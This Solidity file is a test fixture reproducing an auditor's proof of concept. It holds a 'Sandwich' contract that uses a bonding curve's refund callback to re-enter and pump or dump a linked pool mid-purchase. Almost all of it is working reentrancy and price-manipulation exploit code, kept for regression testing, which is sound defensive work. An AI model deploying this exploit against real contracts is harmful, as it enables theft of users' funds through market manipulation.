// Test-only. The auditor's PoC (5 Oct 2026): a buyer contract that moves the pool
// from inside the curve's refund callback. Regression fixture for test/memes-curve.mjs.
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;
interface ICurve { function buy(uint256,uint256,uint256) external payable returns (uint256); }
interface IPool {
  function swapMoliForToken(uint256) external payable returns (uint256);
  function swapTokenForMoli(uint256,uint256) external returns (uint256);
}
interface ITok { function approve(address,uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }
contract Sandwich {
  ICurve curve; IPool pool; ITok tok;
  uint256 mode; uint256 amt; bool inCb;
  constructor(address c, address p, address t) { curve = ICurve(c); pool = IPool(p); tok = ITok(t); }
  // mode 0: plain buy. mode 1: pump pool with `amt` MOLI inside refund. mode 2: dump `amt` tokens inside refund.
  function go(uint256 buyValue, uint256 mode_, uint256 amt_, bool unwind) external payable {
    mode = mode_; amt = amt_; inCb = true;
    curve.buy{value: buyValue}(0, type(uint256).max, type(uint256).max);
    inCb = false;
    if (unwind) {
      uint256 b = tok.balanceOf(address(this));
      if (mode_ == 2) {
        // buy back the dumped amount with MOLI: spend MOLI until token balance restored is approximated by caller
      } else if (b > 0) { tok.approve(address(pool), b); pool.swapTokenForMoli(b, 1); }
    }
  }
  function sellAll() external { uint256 b = tok.balanceOf(address(this)); tok.approve(address(pool), b); pool.swapTokenForMoli(b, 1); }
  function sellSome(uint256 b) external { tok.approve(address(pool), b); pool.swapTokenForMoli(b, 1); }
  function poolBuy(uint256 v) external { pool.swapMoliForToken{value: v}(1); }
  receive() external payable {
    if (inCb && msg.sender == address(curve)) {
      inCb = false;
      if (mode == 1) pool.swapMoliForToken{value: amt}(1);
      else if (mode == 2) { tok.approve(address(pool), amt); pool.swapTokenForMoli(amt, 1); }
    }
  }
}
